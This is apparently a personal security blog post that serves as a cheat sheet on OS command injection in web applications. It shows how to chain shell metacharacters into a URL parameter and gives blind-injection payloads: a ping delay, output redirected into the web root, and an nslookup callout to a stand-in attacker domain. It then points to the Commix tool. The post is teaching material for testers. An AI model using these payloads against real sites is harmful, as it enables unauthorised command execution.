---
layout: blog
type: blog
title: Web Application Security - Command Injection
permalink: blog/web-command-injection
# All dates must be YYYY-MM-DD format!
date: 2021-11-15
labels:
  - rce
  - commix
---

## Useful Commands

| Purpose of command | Linux | Windows |
| :--- | :---: | ---: |
| Name of current user |	whoami | whoami |
| Operating system | uname -a | ver |
| Network configuration | ifconfig | ipconfig /all |
| Network connections | netstat -an | netstat -an |
| Running processes | ps -ef | tasklist |

## Executing arbitrary commands

Simply edit the parameters with commands like
```shell
|, ||, &&, & and ; #to end the current command and run another

`` #used to run commands inbetween another command in linux

#Commands
whoami, uname -a, etc

e.g.
https://insecure-website.com/stockStatus?productID=381&storeID=29

becomes

https://insecure-website.com/stockStatus?productID=381;whoami||&storeID=29 
```


## Blind Command Injections

Many instances of OS command injection are blind vulnerabilities.

### Using time delays

Using a command that will trigger a time delay, allowing you to confirm that the command was executed based on the time the application takes to respond.

The ping command is an effective way to do this, e.g.

```shell
& ping -c 10 127.0.0.1 &
```

This will cause the ping command to ping the loopback address for 10 seconds.

### Redirecting output
If the web root directory is known, the output of a command could be redirected to a file in this directory and accessed easily through the browser, e.g.

```shell
& whoami > /var/www/html/whoami.txt &
```

### Using out-of-band techniques
 You can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques. For example:

```shell
& nslookup kgji2ohoyw.web-attacker.com &
```

This payload uses the nslookup command to cause a DNS lookup for the specified domain. The attacker can monitor for the specified lookup occurring, and thereby detect that the command was successfully injected.

# Automated tool
[Commix](https://github.com/commixproject/commix) tool can be used to automate command injection enumeration and exploitation.
